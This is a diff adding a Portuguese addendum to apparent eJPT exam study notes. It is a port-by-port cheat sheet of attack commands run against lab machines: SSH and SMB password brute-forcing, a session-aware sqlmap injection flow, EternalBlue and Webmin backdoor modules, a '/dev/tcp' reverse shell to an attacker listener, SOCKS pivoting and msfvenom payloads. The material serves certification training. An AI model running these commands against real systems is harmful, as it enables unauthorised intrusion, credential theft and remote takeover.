@@ -398,3 +398,109 @@ mkdir /mnt/nfs && mount -t nfs IP:/export /mnt/nfs
 HOST 10.10.10.20 | 21,22,80 | vsftpd 2.3.4 | cred: anonymous / vazio | achado: /var/www/notes.txt
 ```
 Uma credencial anotada agora responde uma questão 3 horas depois.
+
+---
+
+# ADENDO 20/OUT — CORREÇÕES POR CENÁRIO (todas testadas na máquina hoje)
+
+## Tabela de bolso: porta aberta → primeiro comando
+
+| Porta | Primeiro comando (cola e roda) | Se der sinal positivo |
+|---|---|---|
+| 21 | `nmap -p21 --script ftp-anon IP` | Cenário B (anon → mget → grep cred) |
+| 22 | `nmap -p22 -sV --script ssh-auth-methods IP` | Cenário D (reusar cred antes de brutar) |
+| 80/443/8080 | `nmap -p80,8080 --script http-title,http-headers,http-methods IP` | Cenário C (gobuster → sqli → upload) |
+| 139/445 | `nmap -p445 --script smb-os-discovery,smb-vuln-ms17-010 IP` | Cenário A (EternalBlue / psexec / shares) |
+| 3306 | `nmap -p3306 --script mysql-info,mysql-enum IP` | `mysql -h IP -u root -p` |
+| 3389 | `nmap -p3389 -sV --script rdp-ntlm-info IP` | msf `rdp_login` + `xfreerdp` |
+| 10000 | `curl -sk https://IP:10000/ \| head` | Webmin < 1.920 → msf `webmin_backdoor` |
+| 2049/111 | `showmount -e IP` | montar NFS e ler arquivos |
+| rede extra | (dentro da sessão) `ipconfig /all` ou `ip addr` | Cenário E (autoroute → socks → proxychains) |
+
+## A (SMB/445) — 4 correções
+
+1. **Wordlist no msf sempre em `$HOME`** — `/usr/share/wordlists` não é legível pelo snap:
+```bash
+msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS IP; set SMBUser usuario; \
+ set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; set STOP_ON_SUCCESS true; \
+ set VERBOSE true; run; exit -y"
+```
+2. **Share anônimo pelo msf não funciona** (`Invalid Cred details can't be blank`). Usar impacket:
+```bash
+~/venvs/pentest/bin/smbclient.py guest@IP -no-pass
+```
+3. **impacket `-port` só aceita 139/445** — host interno em porta escondida: usar a lib
+```bash
+~/venvs/pentest/bin/python -c "
+from impacket.smbconnection import SMBConnection
+c=SMBConnection('IP','IP',sess_port=4450,timeout=10); c.login('','')
+print([s['shi1_netname'].rstrip(chr(0)) for s in c.listShares()])"
+```
+4. **`more` vs `cat`**: no `smbclient` do Samba é `more arquivo.txt`; no `smbclient.py` do impacket é `cat`.
+   Confundir os dois custa minutos no exame.
+
+## B (FTP/21) — 2 correções
+- `hydra` FTP funciona localmente, **mas**: confirmar o acerto com login real (`ftp IP` → usuário/senha).
+  Falso positivo de hydra já apareceu 2x nesta máquina.
+- Depois de `mget *`, o ouro está em `grep -riE "pass|user|key|admin" .` e em `.bash_history`,
+  `id_rsa`, `*.bak`, `.git/`. Credencial de FTP quase sempre vale em SSH/SMB/CMS: **testar antes de brutar**.
+
+## C (Web) — 2 correções
+- `gobuster` local: usar `~/wordlists/web/directory-list-2.3-small.txt` (87k) ou `raft-small-words.txt`.
+  A lista `medium` (220k) só quando a small falhar (2-3 min por host).
+- SQLi **com sessão** é o fluxo que extrai dados (validado hoje, ~10 s até o banner):
+```bash
+curl -s -c ~/ck.txt http://IP/login.php -o ~/login.html
+TOKEN=$(grep -oP "user_token' value='\K[0-9a-f]+" ~/login.html)      # só se houver CSRF
+curl -s -b ~/ck.txt -c ~/ck.txt -d "username=admin&password=password&Login=Login&user_token=$TOKEN" http://IP/login.php
+sqlmap -u "http://IP/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=$(grep PHPSESSID ~/ck.txt | awk '{print $7}');security=low" --batch --banner
+```
+
+## D (SSH/22) — a rota que funciona NESTA máquina
+`hydra ssh` não existe localmente (`Compiled without LIBSSH`). As duas que funcionaram hoje,
+contra o container 2222:
+```bash
+# 1) script próprio (paramiko) — mais rápido
+~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t IP -p 22 -l root \
+  -P ~/wordlists/pass/top10k.txt -T 4
+
+# 2) Metasploit — abre sessão direto (VERBOSE true é obrigatório para ver o acerto)
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set RPORT 22; \
+ set USERNAME root; set PASS_FILE /home/libertus/wordlists/pass/top10k.txt; \
+ set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y"
+# resultado real de hoje: [+] Success: 'msfadmin:msfadmin' + [*] SSH session 1 opened
+```
+No Kali do exame: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -f`
+(rockyou inteiro em SSH = 777-1943 h estimadas; usar `-f` e lista curta).
+
+## E (Pivot) — agora com proxychains4 instalado
+```bash
+# 1) sessão de borda em background
+background
+# 2) rota + SOCKS
+use auxiliary/server/socks_proxy
+set VERSION 5
+set SRVPORT 1080
+set SRVHOST 127.0.0.1
+run -j
+# 3) recon interno pelo proxy
+proxychains4 nmap -sT -Pn -p22,80,445,8080,10000 10.10.10.0/24
+```
+Alternativa sem SOCKS: `portfwd add -l 8080 -p 80 -r 10.10.10.20` e atacar `127.0.0.1:8080`.
+Regras do túnel: `-sT` (connect), `-Pn` sempre, `-p` explícito (sem porta o nmap só tenta 80/443
+pelo proxy), UDP não passa.
+
+## F (Shell/transferência) — 2 correções
+- `msfvenom -o /tmp/x.elf` **mente** ("Saved as") e não grava: usar `-o ~/payloads/x.elf`.
+- `nc` local é OpenBSD (sem `-e`): `bash -i >& /dev/tcp/LHOST/4444 0>&1` ou `mkfifo`.
+  Testado hoje: listener 4555 recebeu os dados na hora.
+- Servir arquivo para o alvo: `python3 -m http.server 8000` no Kali (funciona; não é snap).
+
+## G (Bônus) — 1 correção
+`searchsploit` **agora existe** nesta máquina (antes era "usar o navegador"):
+```bash
+searchsploit webmin 1.920
+searchsploit -m 42315
+```
+
